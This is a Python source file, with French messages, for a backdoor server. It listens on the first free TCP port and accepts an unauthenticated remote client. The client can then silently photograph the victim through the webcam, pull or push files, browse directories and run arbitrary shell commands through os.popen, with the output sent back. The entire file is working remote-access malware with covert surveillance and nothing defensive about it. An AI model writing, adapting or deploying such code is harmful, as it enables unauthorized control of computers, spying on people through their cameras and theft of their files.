# coding: utf-8
import numpy
import socket
import os
from time import sleep as sl
from time import time
import cv2
buf=1024

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port=1
while True:
	try:
		socket.bind(('', port))
		break
	except:
		port+=1
cont=True
cap=cv2.VideoCapture(0)
if cap.isOpened():
	cap.release()
print("Ready {}".format(port))

def saveImage():
	if not cap.isOpened():
		cap.open(0)
	ret, frame = cap.read()
	if ret:
		cv2.imwrite("jkolpe.jpg",frame)
	cap.release()
#	if os.path.exists(os.getcwd()+"/jkolpe.txt"):
#		os.remove(os.getcwd()+"/jkolpe.txt")
#	os.rename(os.getcwd()+"/jkolpe.png",os.getcwd()+"/jkolpe.txt")
	return ret

def sendFile(path):
	if os.path.exists(path):
		fichierImage = open(path, "rb")
		tailleImage = str(os.path.getsize(path))
		for i in range(8-len(tailleImage)):
		    tailleImage = "0"+ tailleImage
		try:
			client.send(tailleImage.encode())
		except ConnectionResetError:
				print("Connection fermer")
		try:
			client.send(fichierImage.read())
		except ConnectionResetError:
			print("Connection fermer")
	else:
		client.send(b"none")

def receiveFile(name):
	end=time()+120
	now=time()
	while True:
		tailleImage=client.recv(8).decode()
		if tailleImage!='':
			break
	if tailleImage!="none":
		size = int(tailleImage)
		contenuTelecharge = 0
		with open(name,"wb") as fichierImage:
			while contenuTelecharge < size and now<end:
				now=time()
				contenuRecu = client.recv(1024)
				fichierImage.write(contenuRecu)
				contenuTelecharge += len(contenuRecu)
		if(now>end):
				print("La commande a échoué, retour trop lent de la machine")
	else:
		print("Erreur lors de la prise de photo")


while cont:
	while True:
		socket.listen(5)
		client, address = socket.accept()
		print("{} connected".format( address ))
		client.send(b"good")
		break

	while True:
		try:
			response = client.recv(buf).decode('utf-8')
		except ConnectionResetError:
			print("Connection fermer")
			break
		if response != "":
			sortie="Aucune sortie"
			if response=="close":
				cont=False
				break
			elif response.startswith("buf"):
				try:
					buf=int(response[4:])
					client.send(("buf="+str(buf)).encode("utf-8"))
				except:
					print("Erreur dans la saisie d'arguement")
					try:
						client.send("Errreur dans la saisie d'argument, vous devez saisir un int")
					except ConnectionResetError:
						print("Connection fermer")
						break
			elif response=="getCam":
				save=saveImage()
				if save:
					sendFile("./jkolpe.jpg")
					os.remove("jkolpe.jpg")
				else:
					client.send(b"none")
			elif response.startswith("sendFile"):
				receiveFile(response[9:])
			elif response=="getDos":
				try:
					client.send(os.getcwd().encode("utf-8"))
				except ConnectionResetError:
					print("Connection fermer")
					break
			elif response=="changeToParent":
				os.chdir(os.path.dirname(os.getcwd()))
				client.send(b"none")
			elif response=="getDir":
				client.send(("    - "+"\n    - ".join(os.listdir(os.getcwd()))).encode("utf- 8"))
			elif response.startswith("getFile"):
				file=response[8:]
				sendFile(file)
			elif response.startswith("change"):
				try:
					os.chdir(response[7:])
				except:
					try:
						client.send(b"Erreur d'argument")
					except ConnectionResetError:
						print("Connection fermer")
						break
				else:
					try:
						client.send(("Nouveau répertoire: "+os.getcwd()).encode("utf8"))
					except ConnectionResetError:
						print("Connection fermer")
						break
			else:
				print(response)
				try:
					sortie=os.popen(response,'r',buf).read()
				except:
					print("Erreur lors de la commande")
					sortie="Erreur lors de la commande"
				if(sortie==""):
					sortie="none"
				else:
					print(sortie)
				try:
					client.send(sortie.encode('utf-8'))
				except ConnectionResetError:
					print("Connection fermer")
					break



print("Close")
client.close()
socket.close()
#____________________________________